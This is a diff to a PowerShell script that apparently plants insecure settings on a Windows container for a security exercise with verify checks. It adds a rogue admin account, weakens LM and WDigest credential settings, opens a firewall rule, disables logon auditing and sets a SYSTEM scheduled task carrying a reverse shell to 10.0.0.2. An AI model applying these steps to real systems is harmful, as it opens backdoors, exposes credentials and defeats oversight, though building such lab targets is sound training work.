@@ -14,7 +14,7 @@ $securePw = ConvertTo-SecureString $adminPw -AsPlainText -Force
 New-LocalUser -Name $admin -Password $securePw -PasswordNeverExpires -AccountNeverExpires | Out-Null
 Add-LocalGroupMember -Group "Administrators" -Member $admin
 
-$rogueSecure = ConvertTo-SecureString "changeme" -AsPlainText -Force
+$rogueSecure = ConvertTo-SecureString "Changeme!1" -AsPlainText -Force
 New-LocalUser -Name $rogue -Password $rogueSecure -PasswordNeverExpires -AccountNeverExpires | Out-Null
 Add-LocalGroupMember -Group "Administrators" -Member $rogue
 
@@ -29,12 +29,17 @@ Set-ItemProperty -Path $lsa -Name LmCompatibilityLevel -Value 0 -Type DWord
 
 # ---- WDigest credential caching enabled ---------------------------------------
 $wdigest = "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"
-New-Item -Path $wdigest -Force | Out-Null
+if (-not (Test-Path $wdigest)) { New-Item -Path $wdigest -Force | Out-Null }
 Set-ItemProperty -Path $wdigest -Name UseLogonCredential -Value 1 -Type DWord
 
 # ---- rogue inbound firewall rule ---------------------------------------------
-New-NetFirewallRule -DisplayName $fwRule -Direction Inbound -Protocol TCP `
-    -LocalPort $fwPort -Action Allow -Profile Any | Out-Null
+# MpsSvc is absent from Server-Core containers; New-NetFirewallRule will throw
+# "no more endpoints available". The verify check will then see no rule (pass);
+# treat this as a known-degraded check on container targets.
+try {
+    New-NetFirewallRule -DisplayName $fwRule -Direction Inbound -Protocol TCP `
+        -LocalPort $fwPort -Action Allow -Profile Any | Out-Null
+} catch { Write-Warning "firewall rule plant skipped: $_" }
 
 # ---- scheduled task (SYSTEM) with encoded-command reverse shell ---------------
 $payload = "`$c=New-Object Net.Sockets.TCPClient('10.0.0.2',$fwPort);" +
@@ -54,5 +59,9 @@ auditpol.exe /set /subcategory:"Logon" /success:disable /failure:disable | Out-N
 
 # ---- PowerShell v2 registry flag (legacy engine) ------------------------------
 $ps2 = "HKLM:\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine"
-New-Item -Path $ps2 -Force | Out-Null
-Set-ItemProperty -Path $ps2 -Name PowerShellVersion -Value "2.0"
+# This key is TrustedInstaller-owned in Server-Core containers; write fails
+# with SecurityException even as ContainerAdministrator. Best-effort.
+try {
+    if (-not (Test-Path $ps2)) { New-Item -Path $ps2 -Force | Out-Null }
+    Set-ItemProperty -Path $ps2 -Name PowerShellVersion -Value "2.0" -ErrorAction Stop
+} catch { Write-Warning "PowerShellEngine key plant skipped: $_" }
